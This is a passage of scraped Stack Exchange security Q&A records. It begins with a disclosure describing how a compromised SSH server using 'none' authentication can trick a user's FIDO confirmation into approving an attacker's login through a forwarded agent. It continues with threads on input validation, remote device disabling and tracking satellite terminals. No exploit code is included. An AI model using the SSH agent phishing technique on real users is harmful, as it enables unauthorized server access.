<p>The user wants to connect to a development server with public key authentication and agent forwarding enabled, which is needed, because the user needs to access an internal git repo over ssh.</p>
<p>The server got compromised and the attacker has access to the forwarded agent.</p>
<p>This is the same scenario as by the Matrix server hack in 2019.</p>
<p>Another scenario is remote copy of files. New implementations of openssh (&gt;8.4) supports agent forwarding in scp and sftp, which makes this attack also possible.</p>
<h2>Normal behavior</h2>
<p>When the user connects to a dev server with public key authentication, the user have to push the button on the fido device.</p>
<p>The attacker got access to the forwarded agent and uses this agent to get access to another server. This does not work, because the user needs to push the button an the fido 2 device.</p>
<p>This is not expected and the user will close the session an inform the administrator of the compromised server.</p>
<h2>Bypass of fido 2 devices and ssh-askpass</h2>
<p>If the attacker configures the ssh server, so it does not need credentials to login, an attacker can bypass the first confirmation for the fido device or ssh-askpass.</p>
<p>This can be done, by using the authentication method &quot;none&quot;.</p>
<p>If the client connects to the compromised server, the server accepts the connection and requests the agent.</p>
<p>After the attacker got the agent, the attacker can try to login to a different server, which will need a confirmation on the fido device.</p>
<p>The user thinks, that this confirmation is for the development server, because he does not know, that he is already connected. After the confirmation, the attacker is logged in to the other server.</p>
<p><strong>Note on the the scenario</strong></p>
<p>The described scenario the most basic scenario and has a lot of drawbacks. &quot;none&quot; authentication is the most obvious authentication method, because it is always present on the client side and allows a login without authentication, which is required for the phishing attack.</p>
<p>Advanced attacks should choose other authentication methods or flaws in the client's authentication process. For example &quot;keyboard-interactive&quot; also allows logging in without passwords.</p>
<p><strong>Disclosure:</strong>
I found this phishing attack during an audit and developed the improvements/fixes for PuTTY and Dropbear. The documentation about trivial authentication is for my tool &quot;<a href=""https://github.com/ssh-mitm/ssh-mitm"" rel=""nofollow noreferrer"">SSH-MITM</a>&quot;, which is a man in the middle audit tool for ssh.</p>
","2"
"260116","260116","Preventing users from tampering with input","<p>Let's say that I have a single-page web app written in JavaScript and a server-side API, both changeable by me. The app calculates some values based on user input and POSTs these to the API. The values are <em>based</em> on user input but do not <em>contain</em> user input. For instance it might ask the user to pick A or B based on radio buttons, then send their choice to the server. There is no session, and the user is anonymous.</p>
<p>Rule #1 is Never Trust User Input. A malicious user could modify the payload, and change &quot;A&quot; to &quot;C&quot; (not one of the choices). I don't want that to happen.</p>
<p>For simple cases there is an obvious solution: validate the input server-side. If it's not &quot;A&quot; or &quot;B&quot;, reject it. In a complex app, though, the number of possible permutations could make validation very difficult.</p>
<p>The app could digitally sign the calculated payload before sending it, but as the JavaScript is available to the client, a user could obtain both the key and the algorithm. Obfuscation isn't sufficient here.</p>
<p>Has anyone come up with any way to prevent this sort of tampering? Time-based keys provided by the server? Web3? Or is there a formal proof that it is impossible (aside from server-side validation against a set of input constraints)?</p>
","15","6","260117","<p>The only way you can handle this is by authenticating the connection <strong>and</strong> controlling what happens in the browser. Authenticating the connection is of course possible, but to control the browser is another matter. You'd have to trust both the OS and the browser, and avoid leaking any authentication keys.</p>
<p>All in all: no this is not really possible, at least not for generic users. It may be possible to a certain extend if the computers are controlled by trusted entities. However, in general you should maintain a secure state on the server, and that includes validating input in case that can trigger such an invalid state.</p>
","5"
"260116","260116","Preventing users from tampering with input","<p>Let's say that I have a single-page web app written in JavaScript and a server-side API, both changeable by me. The app calculates some values based on user input and POSTs these to the API. The values are <em>based</em> on user input but do not <em>contain</em> user input. For instance it might ask the user to pick A or B based on radio buttons, then send their choice to the server. There is no session, and the user is anonymous.</p>
<p>Rule #1 is Never Trust User Input. A malicious user could modify the payload, and change &quot;A&quot; to &quot;C&quot; (not one of the choices). I don't want that to happen.</p>
<p>For simple cases there is an obvious solution: validate the input server-side. If it's not &quot;A&quot; or &quot;B&quot;, reject it. In a complex app, though, the number of possible permutations could make validation very difficult.</p>
<p>The app could digitally sign the calculated payload before sending it, but as the JavaScript is available to the client, a user could obtain both the key and the algorithm. Obfuscation isn't sufficient here.</p>
<p>Has anyone come up with any way to prevent this sort of tampering? Time-based keys provided by the server? Web3? Or is there a formal proof that it is impossible (aside from server-side validation against a set of input constraints)?</p>
","15","6","260118","<p><strong>TL,DR:</strong> It's impossible to do so client side.</p>
<p>Client side validation is just a client convenience, not useful to really validate anything. You don't want the client to mistype his email, putting an invalid char somewhere, and have to wait the form being submitted, the server parsing it, and sending back an error 5 seconds later, you want the error to show instantly. You validate on the client, but you ignore the client validation entirely and validate again on the server.</p>
<p>If the validation is made client-side, the client may submit the request by hand, bypassing all validation. Even if you use hashing, signing, obfuscating or anything else, the result is an HTTP request and the client can intercept it and tamper it.</p>
<p>If your use case is what you asked, server validation it's not difficult at all. Have a table with all questions and all valid answers, and check every client answer with the table. On the first invalid answer you stop the processing and send back an empty page.</p>
<blockquote>
<p>the number of possible permutations could make validation very difficult.</p>
</blockquote>
<p>You have to choose between server-side (from trivial to very difficult) and client side (not possible at all). I believe the choice is easy.</p>
","88"
"260116","260116","Preventing users from tampering with input","<p>Let's say that I have a single-page web app written in JavaScript and a server-side API, both changeable by me. The app calculates some values based on user input and POSTs these to the API. The values are <em>based</em> on user input but do not <em>contain</em> user input. For instance it might ask the user to pick A or B based on radio buttons, then send their choice to the server. There is no session, and the user is anonymous.</p>
<p>Rule #1 is Never Trust User Input. A malicious user could modify the payload, and change &quot;A&quot; to &quot;C&quot; (not one of the choices). I don't want that to happen.</p>
<p>For simple cases there is an obvious solution: validate the input server-side. If it's not &quot;A&quot; or &quot;B&quot;, reject it. In a complex app, though, the number of possible permutations could make validation very difficult.</p>
<p>The app could digitally sign the calculated payload before sending it, but as the JavaScript is available to the client, a user could obtain both the key and the algorithm. Obfuscation isn't sufficient here.</p>
<p>Has anyone come up with any way to prevent this sort of tampering? Time-based keys provided by the server? Web3? Or is there a formal proof that it is impossible (aside from server-side validation against a set of input constraints)?</p>
","15","6","260126","<p>You'll have to validate it on the server side. You say that the number of possible permutations is too large - but the client side somehow did it, didn't it? If the server side doesn't have enough information to efficiently validate the input, then have the client send more info. Worst case scenario - just send all the raw user inputs and re-calculate everything on server side, ignoring the client side work entirely.</p>
","25"
"260116","260116","Preventing users from tampering with input","<p>Let's say that I have a single-page web app written in JavaScript and a server-side API, both changeable by me. The app calculates some values based on user input and POSTs these to the API. The values are <em>based</em> on user input but do not <em>contain</em> user input. For instance it might ask the user to pick A or B based on radio buttons, then send their choice to the server. There is no session, and the user is anonymous.</p>
<p>Rule #1 is Never Trust User Input. A malicious user could modify the payload, and change &quot;A&quot; to &quot;C&quot; (not one of the choices). I don't want that to happen.</p>
<p>For simple cases there is an obvious solution: validate the input server-side. If it's not &quot;A&quot; or &quot;B&quot;, reject it. In a complex app, though, the number of possible permutations could make validation very difficult.</p>
<p>The app could digitally sign the calculated payload before sending it, but as the JavaScript is available to the client, a user could obtain both the key and the algorithm. Obfuscation isn't sufficient here.</p>
<p>Has anyone come up with any way to prevent this sort of tampering? Time-based keys provided by the server? Web3? Or is there a formal proof that it is impossible (aside from server-side validation against a set of input constraints)?</p>
","15","6","260132","<p>Also, apart from the necessity of validation server-side to have any hope of security do <em>NOT</em> attempt to validate by any &quot;economical&quot; RegEx expressions.</p>
<p>Even if the legit user would only send you a certain class of strings, the bad people can send you &quot;strings&quot; with bad characters, which are too long, etc., so you do <em>NOT</em> want to give user inputs any leeway.</p>
<p>RegExp testing is subtle enough (DFA or not? greedy matching or not? ...) that it's not the way to go even if you have an idea about it. Make a look-up with hard-coded legit inputs.</p>
","1"
"260116","260116","Preventing users from tampering with input","<p>Let's say that I have a single-page web app written in JavaScript and a server-side API, both changeable by me. The app calculates some values based on user input and POSTs these to the API. The values are <em>based</em> on user input but do not <em>contain</em> user input. For instance it might ask the user to pick A or B based on radio buttons, then send their choice to the server. There is no session, and the user is anonymous.</p>
<p>Rule #1 is Never Trust User Input. A malicious user could modify the payload, and change &quot;A&quot; to &quot;C&quot; (not one of the choices). I don't want that to happen.</p>
<p>For simple cases there is an obvious solution: validate the input server-side. If it's not &quot;A&quot; or &quot;B&quot;, reject it. In a complex app, though, the number of possible permutations could make validation very difficult.</p>
<p>The app could digitally sign the calculated payload before sending it, but as the JavaScript is available to the client, a user could obtain both the key and the algorithm. Obfuscation isn't sufficient here.</p>
<p>Has anyone come up with any way to prevent this sort of tampering? Time-based keys provided by the server? Web3? Or is there a formal proof that it is impossible (aside from server-side validation against a set of input constraints)?</p>
","15","6","260142","<p>A separate security device may work. Such a device should contain the private key that is impossible to get outside the device, own independent keyboard and a small CPU that can internally apply the internal private key for digitally signing the input. The signature then can be verified using external public key but the signed content cannot be forged. Something must also be done against replay attack (maybe include some single-use random sequence as part of the signed content).</p>
<p>In the simplest case the user can read the signed content on the single line screen of the device and type into the form of your website, so you do not need to program also drivers. The input could be intercepted and modified at this point, but then it will be wrongly signed.</p>
<p>Some banks use comparable devices for authentication in they websites. They must be robust against reverse engineering but they only need to discard the private key if being tampered.</p>
","1"
"260116","260116","Preventing users from tampering with input","<p>Let's say that I have a single-page web app written in JavaScript and a server-side API, both changeable by me. The app calculates some values based on user input and POSTs these to the API. The values are <em>based</em> on user input but do not <em>contain</em> user input. For instance it might ask the user to pick A or B based on radio buttons, then send their choice to the server. There is no session, and the user is anonymous.</p>
<p>Rule #1 is Never Trust User Input. A malicious user could modify the payload, and change &quot;A&quot; to &quot;C&quot; (not one of the choices). I don't want that to happen.</p>
<p>For simple cases there is an obvious solution: validate the input server-side. If it's not &quot;A&quot; or &quot;B&quot;, reject it. In a complex app, though, the number of possible permutations could make validation very difficult.</p>
<p>The app could digitally sign the calculated payload before sending it, but as the JavaScript is available to the client, a user could obtain both the key and the algorithm. Obfuscation isn't sufficient here.</p>
<p>Has anyone come up with any way to prevent this sort of tampering? Time-based keys provided by the server? Web3? Or is there a formal proof that it is impossible (aside from server-side validation against a set of input constraints)?</p>
","15","6","260144","<p>Just a few notes:</p>
<blockquote>
<p>Obfuscation isn't sufficient here.</p>
</blockquote>
<p>Any client-side validation is essentially just as good as, and in a stretch of imagination can even be considered, obfuscation.</p>
<blockquote>
<p>In a complex app, though, the number of possible permutations could
make validation very difficult.</p>
</blockquote>
<p>Validation <em>is</em> hard. I'd go so far as to say that validation can be one of the most difficult and persistent obstacles that web developers face. Too often do bad actors attempt to infiltrate any area of input. They're all attack vectors.</p>
<p>Unfortunately, systems which require complex validation often need custom solutions, but there are a few patterns and frameworks you can follow. For example, you can create infinitely customizable validators using ASP.Net. Here's a start if you're curious:</p>
<p><a href=""https://docs.microsoft.com/en-us/aspnet/core/mvc/models/validation?view=aspnetcore-6.0#model-state"" rel=""nofollow noreferrer"">https://docs.microsoft.com/en-us/aspnet/core/mvc/models/validation?view=aspnetcore-6.0#model-state</a></p>
","2"
"260078","260078","Can the manufacturer remotely turn off my device?","<p>In connection with recent events, I, as an ordinary citizen of Russia, wonder - can smartphone manufacturers (Google, Apple, Huawei, etc.) or any another (such as Microsoft, Cisco etc) remotely turn off my phone (or any another device)? I see questions like this have <a href=""https://security.stackexchange.com/questions/62326/how-can-the-nsa-remotely-turn-on-your-iphone"">been</a> <a href=""https://security.stackexchange.com/questions/59093/snowden-the-nsa-can-remotely-turn-on-your-iphone"">asked</a>, but they usually say &quot;remote enable&quot; and mine says otherwise.</p>
<p>Recently, there have been constant warnings on various forums that it is urgent to disable all updates on both desktop computers and mobile phones, saying that with the next update, all phones will turn into a pumpkin. As I understand it, this is more of an informational occasion to collect likes and views, but nevertheless the question remains serious - how much can manufacturers influence their customers and <strong>have there been similar precedents in world practice?</strong></p>
","39","8","260081","<p>There are a couple of different ways to tackle this question:</p>
<ul>
<li>is there, right now, a means for any manufacturer, using existing means, to send a signal that turns off a device?</li>
<li>is it possible for an update to add this feature?</li>
<li>has it happened?</li>
</ul>
<p>It would be very dangerous for a manufacturer to include this feature as a normal function. This would mean that the device is not under the customer's full control. If this was known to customers, they would not buy the device. If the manufacturer were to use this feature, the lawsuits would pile up overnight. So, no, this is not a normal feature.</p>
<p>Could an update add this feature? Of course. Updates are designed to alter how the device functions. It would be trivial to add such a feature in an update.</p>
<p>But it has not happened. As soon as a manufacturer did it, no one would trust the manufacturer. So it is never in the manufacturer's best interest to do it.</p>
<p>A long time ago, there were attempts by TV and VCR makers to control what a customer did with their devices. These controls were built in at the time the device was made, so it wasn't an &quot;update&quot;. But even that level of transparent control by the manufacturer was resisted and consumers &quot;voted with their wallets&quot; and forced manufacturers to change. So manufacturers have a long history of experience of what happens when they try to control something that their customers have bought.</p>
<ul>
<li>so what control could a government exert?</li>
</ul>
<p>Controlling the device is not the most efficient method. Especially since there are so many different devices. To control all devices at once, you simply control the network the devices use. And governments already have that control.</p>
","13"
"260078","260078","Can the manufacturer remotely turn off my device?","<p>In connection with recent events, I, as an ordinary citizen of Russia, wonder - can smartphone manufacturers (Google, Apple, Huawei, etc.) or any another (such as Microsoft, Cisco etc) remotely turn off my phone (or any another device)? I see questions like this have <a href=""https://security.stackexchange.com/questions/62326/how-can-the-nsa-remotely-turn-on-your-iphone"">been</a> <a href=""https://security.stackexchange.com/questions/59093/snowden-the-nsa-can-remotely-turn-on-your-iphone"">asked</a>, but they usually say &quot;remote enable&quot; and mine says otherwise.</p>
<p>Recently, there have been constant warnings on various forums that it is urgent to disable all updates on both desktop computers and mobile phones, saying that with the next update, all phones will turn into a pumpkin. As I understand it, this is more of an informational occasion to collect likes and views, but nevertheless the question remains serious - how much can manufacturers influence their customers and <strong>have there been similar precedents in world practice?</strong></p>
","39","8","260089","<p>In the case of smart televisions, not only can it be done, but it has been done - see <a href=""https://news.samsung.com/za/samsung-supports-retailers-affected-by-looting-with-innovative-television-block-function"" rel=""noreferrer"">this Samsung press release</a>.</p>
<p>A number of Samsung televisions were stolen by looters.  Samsung had a list of which televisions were stolen, so the moment anyone tried to activate the smart functions of one of those televisions, it was remotely disabled.</p>
","19"
"260078","260078","Can the manufacturer remotely turn off my device?","<p>In connection with recent events, I, as an ordinary citizen of Russia, wonder - can smartphone manufacturers (Google, Apple, Huawei, etc.) or any another (such as Microsoft, Cisco etc) remotely turn off my phone (or any another device)? I see questions like this have <a href=""https://security.stackexchange.com/questions/62326/how-can-the-nsa-remotely-turn-on-your-iphone"">been</a> <a href=""https://security.stackexchange.com/questions/59093/snowden-the-nsa-can-remotely-turn-on-your-iphone"">asked</a>, but they usually say &quot;remote enable&quot; and mine says otherwise.</p>
<p>Recently, there have been constant warnings on various forums that it is urgent to disable all updates on both desktop computers and mobile phones, saying that with the next update, all phones will turn into a pumpkin. As I understand it, this is more of an informational occasion to collect likes and views, but nevertheless the question remains serious - how much can manufacturers influence their customers and <strong>have there been similar precedents in world practice?</strong></p>
","39","8","260092","<p>Examples of this happening? The Samsung Galaxy phones (I forget which model) that had the bad battery design that kept exploding. Multiple updates were pushed out that, among other things, disabled charging of the battery and eventually that simply shut them down. There was also one that disabled many of their features before this happened.</p>
<p><a href=""https://duckduckgo.com/?q=exploding+samsung+galaxy+gets+firmware+update+to+stop+charging"" rel=""noreferrer"">https://duckduckgo.com/?q=exploding+samsung+galaxy+gets+firmware+update+to+stop+charging</a></p>
<p>ALL mobile phones have this &quot;capability&quot; should the manufacturer use it. They make and control the firmware updates sent to each phone. In a way (more by <em>lack</em> of action than by something done), it happens all the time, since the manufacturer usually won't bother to make more than a token few software updates before it gets dropped in favor of the next model or Android version (I've been corrected; they are supposed to remain updated for at minimum two years. This still seems short, though). This means that they become outdated sooner than their actual hardware specifications should imply. I actually know someone with a higher-spec phone than <em>mine</em> running a fairly recent Android who can't run some apps because said app expects Android updates for that version from the last 6 months and the manufacturer already stopped updating it (also, some manufacturers don't usually provide updates that fresh, period).</p>
<p>(I'm also told you can disable updates, but if there's a &quot;device disabler&quot; feature in some specific one, it's not like you're going to be <em>told</em> that. Usually you'd want to keep it updated, too.)</p>
<p>There are also numerous &quot;find my device&quot; apps and utilities baked into many phones, which can certainly do this (that's what they're <em>for</em>). Since this is done through the OS provider, we're forced to trust that said company won't just activate it themselves for some reason (or that some government won't ask them to do it either). You frequently <strong>can</strong> disable these, but again, most usually won't or won't even know it's an option.</p>
<p>As for desktops - it's very possible as well. Many do have &quot;LoJacK&quot; or equivalent enabled, which again has very low-level access to the computer (on some, it's even built into the BIOS rather than the operating system). There are few details available to the public, but it's quite likely that even with it &quot;off&quot; (that is to say, you've never activated it yourself) it can still be used at the option of the manufacturer.</p>
<p>Dell, for instance, puts it in the BIOS - <a href=""https://duckduckgo.com/?q=dell+bios+lojack"" rel=""noreferrer"">https://duckduckgo.com/?q=dell+bios+lojack</a></p>
<p>Making matters worse, Intel, AMD, and ARM produce various &quot;security&quot; (usually more for the security of media streaming companies via DRM/rootkits-by-any-other-name than security for <em>you</em>) or &quot;management&quot; systems for their CPUs that are used in enterprise-grade machines to monitor, locate, control, and manage said machines. This hardware module has beyond-top-level hardware access over the Internet (it can read your RAM or hard drive without your knowledge or ability to detect, and attempting to completely remove it will cause your computer to shut itself down on its own after a few minutes of usage).</p>
<p>(<strong>NOTE</strong>: I was not referring to TPMs here. I think it can be argued that those are beneficial. What I meant was sandboxing like ARM TrustZone or equivalent, where usually the only or main thing running on there is your DRM engine. I suspect, but do not know, that tracking software like LoJack would also be run in these. Windows 11 will now be using this feature to &quot;protect&quot; certain OS components as well, but my <em>personal</em> suspicion is that this is also to protect against pirated Office installs and to better secure their DRM.</p>
<p>I'm not sure about how long ARM (TrustZone) has also been doing this, but theirs is present in all smartphone-grade processors produced by them at minimum. Even a lot of their microcontrollers have some version of one of these features.)</p>
<p>Interestingly, modules like ME are <strong>also</strong> present (but <em>allegedly</em> turned off via software) in every single <em>consumer-grade</em> CPU sold from the former two manufacturers since approximately 2006.</p>
<p><a href=""https://github.com/corna/me_cleaner"" rel=""noreferrer"">https://github.com/corna/me_cleaner</a></p>
<p>I've looked more into this, and if Wikipedia can be trusted on this, it runs on a separate physical chip near the CPU and presumably <em>does</em> have backdoored access into at least the Ethernet connection (probably not Wireless, though):</p>
<blockquote>
<p>The ME has its own MAC and IP address for the out-of-band interface,
with direct access to the Ethernet controller; one portion of the
Ethernet traffic is diverted to the ME even before reaching the host's
operating system, for what support exists in various Ethernet
controllers, exported and made configurable via Management Component
Transport Protocol (MCTP).</p>
</blockquote>
<p><a href=""https://en.wikipedia.org/wiki/Intel_Management_Engine"" rel=""noreferrer"">https://en.wikipedia.org/wiki/Intel_Management_Engine</a></p>
","31"
"260078","260078","Can the manufacturer remotely turn off my device?","<p>In connection with recent events, I, as an ordinary citizen of Russia, wonder - can smartphone manufacturers (Google, Apple, Huawei, etc.) or any another (such as Microsoft, Cisco etc) remotely turn off my phone (or any another device)? I see questions like this have <a href=""https://security.stackexchange.com/questions/62326/how-can-the-nsa-remotely-turn-on-your-iphone"">been</a> <a href=""https://security.stackexchange.com/questions/59093/snowden-the-nsa-can-remotely-turn-on-your-iphone"">asked</a>, but they usually say &quot;remote enable&quot; and mine says otherwise.</p>
<p>Recently, there have been constant warnings on various forums that it is urgent to disable all updates on both desktop computers and mobile phones, saying that with the next update, all phones will turn into a pumpkin. As I understand it, this is more of an informational occasion to collect likes and views, but nevertheless the question remains serious - how much can manufacturers influence their customers and <strong>have there been similar precedents in world practice?</strong></p>
","39","8","260093","<p>All of these devices (iPhones, Android phones, even laptops with Windows and macOS) have some kind of &quot;Find my lost device&quot; capability these days. All of them also feature the ability to lockdown and disable device remotely (for purposes of theft prevention).</p>
<p>There's nothing stopping the device vendor (Apple, Samsung, Google, Microsoft, etc.) from sending such a lockout signal themselves and locking you out of your device. They only really need to know your Apple ID/Samsung/Google account. And it doesn't even require a software update.</p>
<p>Of course, it's just much easier to ban the device from mobile network via IMEI/IMSI (also commonly used to disable stolen devices) and that can be done with by the local mobile operator without cooperation of American corporations.</p>
","38"
"260078","260078","Can the manufacturer remotely turn off my device?","<p>In connection with recent events, I, as an ordinary citizen of Russia, wonder - can smartphone manufacturers (Google, Apple, Huawei, etc.) or any another (such as Microsoft, Cisco etc) remotely turn off my phone (or any another device)? I see questions like this have <a href=""https://security.stackexchange.com/questions/62326/how-can-the-nsa-remotely-turn-on-your-iphone"">been</a> <a href=""https://security.stackexchange.com/questions/59093/snowden-the-nsa-can-remotely-turn-on-your-iphone"">asked</a>, but they usually say &quot;remote enable&quot; and mine says otherwise.</p>
<p>Recently, there have been constant warnings on various forums that it is urgent to disable all updates on both desktop computers and mobile phones, saying that with the next update, all phones will turn into a pumpkin. As I understand it, this is more of an informational occasion to collect likes and views, but nevertheless the question remains serious - how much can manufacturers influence their customers and <strong>have there been similar precedents in world practice?</strong></p>
","39","8","260096","<p>Said elsewhere in more detail, and perhaps less directly.<br />
This is the simple version.</p>
<ul>
<li><p>IF your phone has a &quot;find my phone feature&quot; which also allows you to disable and control your phone in various ways, then the manufacturer very likely can too.</p>
</li>
<li><p>If your phone has NOT got a remote disable feature which you can access, then the manufacturer could have added or in future could add one without your knowledge, should they choose.</p>
</li>
</ul>
<p>Both the above assume that various permissions can be overridden by manufacturers. This also is a case of &quot;they can make it so that they can do it if they want to&quot;.</p>
","1"
"260078","260078","Can the manufacturer remotely turn off my device?","<p>In connection with recent events, I, as an ordinary citizen of Russia, wonder - can smartphone manufacturers (Google, Apple, Huawei, etc.) or any another (such as Microsoft, Cisco etc) remotely turn off my phone (or any another device)? I see questions like this have <a href=""https://security.stackexchange.com/questions/62326/how-can-the-nsa-remotely-turn-on-your-iphone"">been</a> <a href=""https://security.stackexchange.com/questions/59093/snowden-the-nsa-can-remotely-turn-on-your-iphone"">asked</a>, but they usually say &quot;remote enable&quot; and mine says otherwise.</p>
<p>Recently, there have been constant warnings on various forums that it is urgent to disable all updates on both desktop computers and mobile phones, saying that with the next update, all phones will turn into a pumpkin. As I understand it, this is more of an informational occasion to collect likes and views, but nevertheless the question remains serious - how much can manufacturers influence their customers and <strong>have there been similar precedents in world practice?</strong></p>
","39","8","260105","<p>Whether this is possible depends on whether the manufacturer shipped a backdoor in the product, and if so, whether that backdoor is exposed to them. Backdoors could take either a</p>
<ul>
<li>passive form, listening for some specially crafted network traffic sent to them and performing an action as a result, or an</li>
<li>active form, continually executing code that reaches out to a command and control server (note: this term is usually used for malware, but I don't distinguish it here because it's the same thing) and either executing commands published by it, or downloading updated software from it.</li>
</ul>
<p>The former is widely recognized as malicious, and not very useful to the manufacturer because they'd need to know your network location and have a way to route unsolicited packets to your device in order to attack it. However, &quot;automatic updates&quot; are widely acclaimed as a security &quot;feature&quot;, and there's not consensus anymore that this kind of phone-home-to-c&amp;c behavior is malicious.</p>
<p>If your device has an option to turn off automatic updates of the system and vendor-bundled software, it's likely that you can prevent them from having any such control over your device. Also, using it only behind a router configured to block access to their c&amp;c (if you can find out what it is; you can probably see this by observing network traffic and looking for background connections to hosts with suspicious names), you should be able to prevent this.</p>
<p>Finally, if you can get third-party OS firmware for the device (e.g. LineageOS for many Android phones) that's not running the manufacturer's software (or at least not running it in a privileged context), they no longer have any backdoor to it.</p>
","3"
"260078","260078","Can the manufacturer remotely turn off my device?","<p>In connection with recent events, I, as an ordinary citizen of Russia, wonder - can smartphone manufacturers (Google, Apple, Huawei, etc.) or any another (such as Microsoft, Cisco etc) remotely turn off my phone (or any another device)? I see questions like this have <a href=""https://security.stackexchange.com/questions/62326/how-can-the-nsa-remotely-turn-on-your-iphone"">been</a> <a href=""https://security.stackexchange.com/questions/59093/snowden-the-nsa-can-remotely-turn-on-your-iphone"">asked</a>, but they usually say &quot;remote enable&quot; and mine says otherwise.</p>
<p>Recently, there have been constant warnings on various forums that it is urgent to disable all updates on both desktop computers and mobile phones, saying that with the next update, all phones will turn into a pumpkin. As I understand it, this is more of an informational occasion to collect likes and views, but nevertheless the question remains serious - how much can manufacturers influence their customers and <strong>have there been similar precedents in world practice?</strong></p>
","39","8","260112","<p>Fully controlling a modern networked device is quite a challenge even if the vendor doesn't actively sabotage you.</p>
<p>And a vendor that doesn't sabotage you in this regard is a rare find in itself.</p>
<p>There is quite a pressure over a smart device vendor:</p>
<ol>
<li>They want to protect their &quot;intelectual property&quot;</li>
<li>They want to limit their liability if they mess something (see Samsung Note 7 battery fires or any published software vulnerability)</li>
<li>They may want to add or remove features on the fly that depend on their partnerships with third parties.</li>
<li>They may have legal obligations to assist law enforcement and/or simply the &quot;legitimate government&quot; (for any meaning of the &quot;legitimate government&quot;).</li>
<li>They need to be friendly to their partnering network operators by supporting their business model</li>
<li>Security bugs happen. Some of them are bad enough to allow not only the manufacturer, but also unrelated third parties, to mess with your smart device functions - up to and beyond rendering it unusable.</li>
</ol>
<p>etc, etc...</p>
<p>This is why they create backdoors here and there (sometimes in unexpected places) in the smart device software.</p>
<p>Smart phones and tablets with completely free (i.e. auditable and supposedly backdoor-free) software (both vendor-provided or installable by the customer) are rare, a lot of them obsolete and generally not attractive to the general consumer.</p>
","5"
"260078","260078","Can the manufacturer remotely turn off my device?","<p>In connection with recent events, I, as an ordinary citizen of Russia, wonder - can smartphone manufacturers (Google, Apple, Huawei, etc.) or any another (such as Microsoft, Cisco etc) remotely turn off my phone (or any another device)? I see questions like this have <a href=""https://security.stackexchange.com/questions/62326/how-can-the-nsa-remotely-turn-on-your-iphone"">been</a> <a href=""https://security.stackexchange.com/questions/59093/snowden-the-nsa-can-remotely-turn-on-your-iphone"">asked</a>, but they usually say &quot;remote enable&quot; and mine says otherwise.</p>
<p>Recently, there have been constant warnings on various forums that it is urgent to disable all updates on both desktop computers and mobile phones, saying that with the next update, all phones will turn into a pumpkin. As I understand it, this is more of an informational occasion to collect likes and views, but nevertheless the question remains serious - how much can manufacturers influence their customers and <strong>have there been similar precedents in world practice?</strong></p>
","39","8","260127","<p>There are different levels of “can”. For example, if Apple right now decided that they hate you, could they turn your phone off? Most likely not. Could they make a change to their infrastructure or to the software on your phone so they could turn off your phone? They probably could. Would they do it? Not likely, because the ability being there is a security hole, and doing it would cause very bad negative press.</p>
<p>You can register your phone with “Find my phone”. If you do, first it will report its location to apple who will report it to your other devices. Turning your phone off won’t prevent it. (Your phone will be whimpering on Bluetooth low energy “I’m lost” and any iPhone nearby will report it anonymously to apple. Including the iPhone of the thief stealing your phone).</p>
<p><em>You</em> can shut down this phone from another device. This will sent a message to apple, which will send a message to your phone, which will shut itself down. I think this requires some code specific to your phone that only your other devices have and apple doesn’t so apple can’t shut down your phone that way - but they could. What you have to trust is the integrity of apple, and the integrity of its software developers, and if any of them had been asked to add this ability, someone would have told the public.</p>
<p>Apple can do automatic updates if you ask for them. Could they do automatic updates without you asking? Possibly. Can they? Possibly not. It has been said that apple could disable any app that you purchased, but apple has never done that, and supposedly apple would only do that to stop active malware where any sane user would be happy if it was stopped. <em>And</em> this is more of a rumour.</p>
<p>Last, software contacts apple servers to get services. That is something that apple could stop. There would be legal problems. Refusing to sell goods is one thing, but not delivering paid for services is something different.</p>
<p>(Don’t know enough about Android)</p>
","2"
"260004","260004","How to reduce/mitigate the degree to which a Starlink terminal user in a war zone is giving their position in real time?","<p>Space.com's <a href=""https://www.space.com/spacex-starlink-terminals-arrive-ukraine-elon-musk-russia"" rel=""noreferrer"">SpaceX Starlink satellite internet terminals arrive in Ukraine</a>, The Verge's <a href=""https://www.theverge.com/2022/2/28/22955339/elon-musk-spacex-starlink-ukraine-user-terminals-russia-invasion"" rel=""noreferrer"">Elon Musk’s promised Starlink terminals have reached Ukraine</a> and Vice Prime Minister of Ukraine and Minister of Digital Transformation of Ukraine's <a href=""https://twitter.com/FedorovMykhailo/status/1498392515262746630"" rel=""noreferrer"">tweet</a>:</p>
<blockquote>
<p>Starlink — here. Thanks, @elonmusk</p>
</blockquote>
<p>explain that requested Starlink coverage and terminals have been made available in Ukraine during a period of highly active warfare involving nations and equipment of advanced war fighting technology. These might include satellite, aircraft (fighters, bombers, UAVs) and ground equipment.</p>
<p><strong>Question:</strong> How to reduce/mitigate the degree to which a Starlink terminal user in a war zone is giving their position in real time?</p>
<p><em>For example</em>, does simply turning the thing on immediately identify your location as a Starlink user by radio transmissions? Do you have to start using it for data before that happens? Can its radiated signals be readily picked up from any direction?</p>
<p>What might be measures that a Starlink ground station could use to reduce or mitigate some of these risks?</p>
<p><em>For example</em>, can you use it in &quot;burst mode&quot; i.e. on for a few seconds every few minutes to make some kinds of tracking or homing more difficult? Put it in a hole in the ground lined with chicken wire to reduce low elevation radiation?</p>
","30","4","260008","<p>In another conflict, some people have allegedly been tracked and killed due their use of satellite phones or internet. One mitigation is to separate uplink location and site where the connection is actually used.</p>
<p>From an article <a href=""https://www.eff.org/deeplinks/2012/02/satphones-syria-and-surveillance"" rel=""nofollow noreferrer"">&quot;Satphones, Syria, and Surveillance&quot; by the Electronic Frontier Foundation (EFF)</a>, which reports on the above incident:</p>
<blockquote>
<p>There are a few different ways by which satellite phones can be
tracked.  The first—and easiest for a government actor—would be to
simply ask or pressure a company to hand over user data.  This is not
beyond the realm of possibility (readers might recall an incident in
which Yahoo handed over information about a Chinese dissident to his
government, resulting in a ten year prison term), but is just one of
several methods.</p>
<p>Satellite phones can also be tracked by technical means and there is
ample technology already on the market for doing so.  For example,
this portable Thuraya monitoring system by Polish company TS2, which
also counts several US government agencies as clients; these systems
for monitoring Thuraya and Iridium phones, created by Singaporean
company Toplink Pacific; or this satellite phone tracking technology
from UK based Delma MMS.</p>
<p>Authorities can find the position of a satellite phone using manual
triangulation, but in order to track a phone in this manner, the
individual would need to be relatively close by. Nowadays, however,
most satellite phones utilize GPS, making them even easier to track
using products widely available on the market such as those mentioned
above.  Some of these products allow not only for GPS tracking, but
also for interception of voice and text communications and other
information.</p>
</blockquote>
<p>The article has been referenced on twitter on this thread: <a href=""https://twitter.com/jsrailton/status/1498426984241713152"" rel=""nofollow noreferrer"">https://twitter.com/jsrailton/status/1498426984241713152</a></p>
","22"
